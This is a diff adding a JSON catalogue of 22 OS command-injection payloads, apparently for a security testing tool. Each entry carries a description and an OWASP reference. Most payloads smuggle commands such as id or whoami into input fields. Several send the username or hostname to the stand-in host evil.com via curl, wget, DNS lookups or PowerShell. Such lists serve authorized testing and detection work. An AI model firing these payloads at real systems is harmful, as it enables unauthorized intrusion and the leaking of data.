@@ -1,0 +1,182 @@
+[
+  {
+    "id": "cmdi-001",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "; id",
+    "context": "string",
+    "description": "Basic OS command injection with semicolon separator",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-002",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "| id",
+    "context": "string",
+    "description": "OS command injection with pipe separator",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-003",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "|| id",
+    "context": "string",
+    "description": "OS command injection with OR operator",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-004",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "$(id)",
+    "context": "string",
+    "description": "OS command injection with command substitution",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-005",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "`id`",
+    "context": "string",
+    "description": "OS command injection with backtick substitution",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-006",
+    "family": "cmdi",
+    "subtype": "blind",
+    "payload_string": "; sleep 5",
+    "context": "string",
+    "description": "Blind command injection with time delay",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-007",
+    "family": "cmdi",
+    "subtype": "blind",
+    "payload_string": "| timeout 5",
+    "context": "string",
+    "description": "Blind command injection with timeout (Linux)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-008",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "& id &",
+    "context": "string",
+    "description": "OS command injection with ampersand separators (Windows/cmd)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "cmdi-009",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "&& whoami",
+    "context": "string",
+    "description": "OS command injection with AND operator",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-010",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "%0a id",
+    "context": "string",
+    "description": "OS command injection with newline character",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "cmdi-011",
+    "family": "cmdi",
+    "subtype": "blind",
+    "payload_string": "; ping -c 1 evil.com",
+    "context": "string",
+    "description": "Blind command injection for out-of-band data exfiltration",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-012",
+    "family": "cmdi",
+    "subtype": "os_command",
+    "payload_string": "{id}",
+    "context": "string",
+    "description": "OS command injection with brace expansion",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-013", "family": "cmdi", "subtype": "blind",
+    "payload_string": ";ping -c 3 127.0.0.1;", "context": "string",
+    "description": "Blind CMDi - ping delay (Linux)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-014", "family": "cmdi", "subtype": "blind",
+    "payload_string": "&ping -n 3 127.0.0.1&", "context": "string",
+    "description": "Blind CMDi - ping delay (Windows)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"windows": true}
+  },
+  {
+    "id": "cmdi-015", "family": "cmdi", "subtype": "blind",
+    "payload_string": "|ping -c 3 127.0.0.1|", "context": "string",
+    "description": "Blind CMDi - piped ping delay",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "cmdi-016", "family": "cmdi", "subtype": "blind",
+    "payload_string": "`ping -c 3 127.0.0.1`", "context": "string",
+    "description": "Blind CMDi - backtick ping delay",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-017", "family": "cmdi", "subtype": "blind",
+    "payload_string": "$(ping -c 3 127.0.0.1)", "context": "string",
+    "description": "Blind CMDi - command substitution ping delay",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-018", "family": "cmdi", "subtype": "blind",
+    "payload_string": ";curl http://evil.com/`whoami`;", "context": "string",
+    "description": "Blind CMDi - Out-of-band extraction (curl)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-019", "family": "cmdi", "subtype": "blind",
+    "payload_string": ";wget http://evil.com/$(id -u);", "context": "string",
+    "description": "Blind CMDi - Out-of-band extraction (wget)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-020", "family": "cmdi", "subtype": "blind",
+    "payload_string": "|| nslookup `whoami`.evil.com ||", "context": "string",
+    "description": "Blind CMDi - Out-of-band extraction (nslookup/DNS)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "cmdi-021", "family": "cmdi", "subtype": "blind",
+    "payload_string": "; dig `hostname`.evil.com ;", "context": "string",
+    "description": "Blind CMDi - Out-of-band extraction (dig)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"linux": true}
+  },
+  {
+    "id": "cmdi-022", "family": "cmdi", "subtype": "blind",
+    "payload_string": "& powershell -c \"Invoke-WebRequest -Uri http://evil.com/$env:USERNAME\" &", "context": "string",
+    "description": "Blind CMDi - Out-of-band extraction (PowerShell)",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"], "platform_specific": {"windows": true}
+  }
+]
